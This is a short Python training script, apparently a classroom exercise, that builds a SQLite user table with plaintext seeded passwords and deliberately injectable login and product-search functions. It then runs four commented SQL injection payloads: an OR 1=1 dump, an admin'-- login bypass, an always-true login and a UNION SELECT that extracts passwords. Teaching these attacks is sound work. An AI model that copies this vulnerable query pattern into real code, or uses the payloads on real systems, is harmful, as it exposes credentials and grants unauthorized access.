import sqlite3

conn = sqlite3.connect('nyondo_stock.db')

conn.execute('''
   CREATE TABLE IF NOT EXISTS users (
id INTEGER PRIMARY KEY AUTOINCREMENT,
username TEXT NOT NULL,
password TEXT NOT NULL,
role TEXT DEFAULT 'attendant'
);
             
             ''')

conn.execute('''
INSERT OR IGNORE INTO users (username, password, role) VALUES
('admin', 'admin123', 'admin'),
('fatuma', 'pass456', 'attendant'),
('wasswa', 'pass789', 'manager');
             
''')

# step 2 - create your vulnerability file. use code for your track

def search_product(name):
    query = f"SELECT * FROM products WHERE name LIKE '%{name}%'"
    print(f'Query: {query}')

    rows = conn.execute(query).fetchall()
    print(f'Result: {rows}\n')
    return rows

def login(username, password):
    query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
    print(f'Query: {query}')
    row = conn.execute(query).fetchone()
    print(f'Result: {row}\n')
    return row

# STEP 3 
# ATTACK 1 -  dump all your products
# OR 1=1 is always true so the WHERE is pypassed and all products come back 
# including the cost prices which attackers should never see
search_product("' OR 1=1--")
print('\n')

# attack2 login bypass
# the -- comments out the password check. you log in as admin with any password
login("admin'--", "anything")
print('\n')

# attack 3 - always true login
# what happens
#OR '1'='1' is always true. Returns the first user in the database with no credentials.

login("' OR '1'='1", "' OR '1'='1")
print('\n')

# attack 4
# UNION attack
# user steals data from the product search
# The product search now returns the users table including all passwords. 
# This is how attackers steal credentials through a search box.
search_product("' UNION SELECT id, username, password, role FROM users--")
